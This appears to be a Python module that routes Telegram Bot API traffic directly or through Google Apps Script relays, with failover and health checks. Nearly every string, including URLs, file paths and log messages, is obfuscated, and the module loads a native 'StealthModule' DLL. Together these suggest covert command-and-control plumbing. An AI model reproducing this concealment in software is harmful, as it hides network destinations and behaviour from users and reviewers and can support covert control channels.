"""
core/bridge_manager.py — Advanced Telegram Bridge Manager (GAS-only)
Features:
- Multiple bridge failover (Google Apps Script)
- Health checking and auto-switching
- Direct connection fallback check
"""

import os
import time
import json
import base64
import random
import threading
import requests
from typing import Any, Dict, List, Optional
import subprocess
from datetime import datetime
from core.obfuscation import decrypt_string, encrypt_string
from core.error_logger import error_logger

try:
    import clr
    CLR_AVAILABLE = True
except ImportError:
    CLR_AVAILABLE = False

class BridgeNative:
    _manager = None

    @classmethod
    def get_manager(cls):
        if cls._manager is None and CLR_AVAILABLE:
            try:
                project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                dll_path = os.path.join(project_root, "defense", decrypt_string("DEARDyk0dwY2Gw=="))
                if os.path.exists(dll_path):
                    clr.AddReference(dll_path)
                    from StealthModule import BridgeManager as NativeBridge
                    cls._manager = NativeBridge
            except: pass
        return cls._manager

class BridgeConfig:
    """Configuration for bridges"""

    FALLBACK_VPS = []

class BridgeManager:
    """Main bridge manager (GAS-only)"""

    def __init__(self):
        self.bridge_stats = {}
        self.db_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "assets", decrypt_string("DEARDyk0KkwwBAVW"))
        self.bridges: set[str] = set()
        self.current_index = 0
        self.bridge_active = False
        self.failed_attempts = 0
        self.max_failures = 3
        self.lock = threading.Lock()
        self.last_check: float = 0.0
        self.check_interval = 300

        self._load_bridges()

    def _save(self):
        """Save bridges to local JSON with encryption"""
        try:
            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
            encrypted_bridges = [encrypt_string(b) for b in self.bridges]
            with open(self.db_path, 'w') as f:
                json.dump(encrypted_bridges, f)
        except Exception as e:
            error_logger.log(__name__, decrypt_string("KFMRBys1eRY1VxlZBFxGGBxbHAwrImNCIRIX"))

    def _load_bridges(self):
        """Load and decrypt bridges from local file and fallback"""

        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, 'r') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        for b in data:
                            # Try to decrypt, but if it fails or doesn't look like a URL, 
                            # we assume it might be a legacy plaintext URL
                            dec = decrypt_string(b)
                            if dec.startswith("http"):
                                self.bridges.add(dec)
                            else:
                                self.bridges.add(b)
            except: pass

        for vps in BridgeConfig.FALLBACK_VPS:
            self.bridges.add(vps)

        self._save()

    # Auto-deploy removed

    def cleanup_dead_bridges(self):
        """Remove bridges that fail the health check"""
        removed = 0
        with self.lock:

            new_set = set()
            for b in self.bridges:
                if decrypt_string("GV0KACsjKkw+Ehw=") in b:
                    print(decrypt_string("NXAKAio2PD96Iw9LBlAIHU5JGhZuNzYQehQGXRNXEwpAHFY="))
                    if self.test_bridge(b):
                        new_set.add(b)
                    else:
                        print(decrypt_string("NXAKAio2PD96JQ9VHU8PFAkSHA4vNXkAKB4OXxcDRgEMTw=="))
                        removed += 1
                else:
                    new_set.add(b)
            self.bridges = new_set
            self._save()
        return removed

    def clear_all_bridges(self):
        """Clear all bridge workers"""
        with self.lock:
            self.bridges = set(BridgeConfig.FALLBACK_VPS)
            self.current_index = 0
            self._save()
        return 0

    def get_current_bridge(self):
        """Get current active bridge URL"""
        with self.lock:
            if self.bridges:
                blist = sorted(list(self.bridges))
                return blist[self.current_index % len(blist)]
        return None

    def get_all_bridges(self):
        """Get all bridges"""
        with self.lock:
            return list(self.bridges)

    def test_all_bridges(self):
        decrypt_string("OlcLH24wNQ56FRhRFl4DCU5TFg9uIzwWLwUEGABcFQ8CRlgPJzItQiECGFRIGRUPDVEdGD0s")
        results = {}
        bridges = self.get_all_bridges()
        for b in bridges:
            results[b] = self.test_bridge(b)
        return results

    def test_bridge(self, bridge_url):
        """Test if bridge is working with retries"""
        for attempt in range(3):
            try:
                # GAS bridges use ?path= parameter or path info
                is_gas = decrypt_string("HVEKAj4ldwU1GA1UFxcFFQM=") in bridge_url
                
                if is_gas:
                    health_url = bridge_url + decrypt_string("UUIZHyZsdgo/FgZMGg==")
                else:
                    health_url = bridge_url.rstrip('/') + decrypt_string('QVodCiIlMQ==')
                
                response = requests.get(
                    health_url,
                    timeout=8,
                    headers={'User-Agent': decrypt_string('I10CAiI9OE1vWVo=')}
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        return data.get('status') == 'ok' or (is_gas and "ok" in str(data))
                    except:
                        return True
                else:
                    print(decrypt_string("NXAKAio2PD96Pw9ZHk0OWg1aHQglcT8NKFcRUBdYCg4GbQ0ZIix5ED8DH0ocXAJaFUAdGD4+NxE/WRlME00TCTFRFw8rLA=="))

                    if is_gas:
                        test_tg_url = bridge_url + decrypt_string("UUIZHyZsdgA1A1sKQRYBHxp/HQ==")
                    else:
                        test_tg_url = bridge_url.rstrip('/') + decrypt_string('QVAXH39jak09Eh51Fw==')
                        
                    response = requests.get(test_tg_url, timeout=8)

                    if response.status_code in [200, 302, 401]: # GAS may redirect
                        return True

            except Exception as e:
                print(decrypt_string("NXAKAio2PD96Nh5MF1QWDk5JGR86NDQSLlxbRVJfBxMCVxxLKD4rQiEVGFEWXgMlG0AUFnRxIgcn"))
                if attempt < 2:
                    time.sleep(5)
                    continue
                error_logger.log(__name__, decrypt_string("OlcLH243OAs2Eg4YFFYUWhVQCgIqNjw9LwUGRUgZHR8T"))

        return False

    def test_direct_telegram(self):
        """Test direct connection to Telegram API"""
        try:
            response = requests.get(
                decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisF"),
                timeout=3,
                headers={'User-Agent': decrypt_string('I10CAiI9OE1vWVo=')}
            )
            return response.status_code == 200
        except:
            return False

    def get_best_route(self):
        """Determine best route (direct or bridge)"""

        if self.test_direct_telegram():
            self.bridge_active = False
            return {
                'type': 'direct',
                'api_url': decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU="),
                'file_url': decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw=="),
                'latency': 0
            }

        best_bridge = None
        best_latency = float('inf')

        for i, bridge in enumerate(self.bridges):
            try:
                start = time.time()
                if self.test_bridge(bridge):
                    latency = (time.time() - start) * 1000

                    self.bridge_stats[bridge] = {
                        'latency': latency,
                        'last_check': time.time(),
                        'success_rate': self.bridge_stats.get(bridge, {}).get('success_rate', 1.0)
                    }

                    if latency < best_latency:
                        best_latency = latency
                        best_bridge = bridge
                        self.current_index = i
            except:
                continue

        if best_bridge is not None:
            self.bridge_active = True
            is_gas = decrypt_string("HVEKAj4ldwU1GA1UFxcFFQM=") in best_bridge
            
            if is_gas:
                api_url = best_bridge + decrypt_string("UUIZHyZsdgA1AxEIDxYdSxM=")
                file_url = best_bridge + decrypt_string("UUIZHyZsdgQzGw8XEFYSAV5PVxB/LA==")
            else:
                api_url = best_bridge + decrypt_string("QVAXHzVhJE0hRhc=")
                file_url = best_bridge + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
                
            return {
                'type': 'bridge',
                'api_url': api_url,
                'file_url': file_url,
                'bridge_url': best_bridge,
                'latency': best_latency
            }

        return None

    def report_failure(self):
        """Report a bridge failure and switch if needed"""
        with self.lock:
            self.failed_attempts += 1
            if self.failed_attempts >= self.max_failures:
                return self._switch_to_next()
        return False

    def _switch_to_next(self):
        """Switch to next available bridge"""
        old = self.current_index
        blist = sorted(list(self.bridges))
        old_bridge = blist[old] if old < len(blist) else None

        self.current_index = (self.current_index + 1) % len(blist) if blist else 0
        self.failed_attempts = 0

        new_bridge = blist[self.current_index] if blist else None

        error_logger.log(
            __name__,
            f"Bridge switched from {old_bridge} to {new_bridge}"
        )

        print(decrypt_string("NXAKAio2PD96JB1RBloOHwoSDARuMysLPhAPGAlKAxYIHBsePCM8DC4oA1YWXB4HVBIDBSsmBgAoHg5fF0Q="))
        return True

    def auto_switch_if_needed(self):
        """Periodically check and auto-switch if current bridge is dead"""
        now = time.time()
        if now - self.last_check < self.check_interval:
            return

        self.last_check = now

        if self.bridge_active and self.bridges:
            current = self.get_current_bridge()
            if current and not self.test_bridge(current):
                print(decrypt_string("NXAKAio2PD96NB9KAFwIDk5QCgIqNjxCIRQfSgBcCA4TEhwOLzV1QikAA0wRUQ8UCRxWRQ=="))
                self._switch_to_next()

    def get_stats(self):
        """Get bridge statistics"""
        bridge_list = []
        for b in self.bridges:
            stats = self.bridge_stats.get(b, {})

            if b not in self.bridge_stats:
                status = 'untested'
            elif stats.get('latency', 0) > 0:
                status = 'healthy'
                if time.time() - stats.get('last_check', 0) > 600:
                    status = 'stale'
            else:
                status = 'dead'

            bridge_list.append({
                'url': b,
                'latency': stats.get('latency', 0),
                'fails': stats.get('fails', 0),
                'status': status
            })

        return {
            'total_bridges': len(self.bridges),
            'active_bridge': self.get_current_bridge(),
            'bridge_active': self.bridge_active,
            'failed_attempts': self.failed_attempts,
            'current_index': self.current_index,
            'bridges': bridge_list
        }

    def force_deploy(self):
        """Dummy method for compatibility"""
        return self.get_current_bridge()

    def remove_dead_bridge(self, bridge_url):
        """Remove a dead bridge from list"""
        if bridge_url in self.bridges:
            self.bridges.remove(bridge_url)
            self._save()

            if self.current_index >= len(self.bridges):
                self.current_index = 0

            return True
        return False

bridge_manager = BridgeManager()
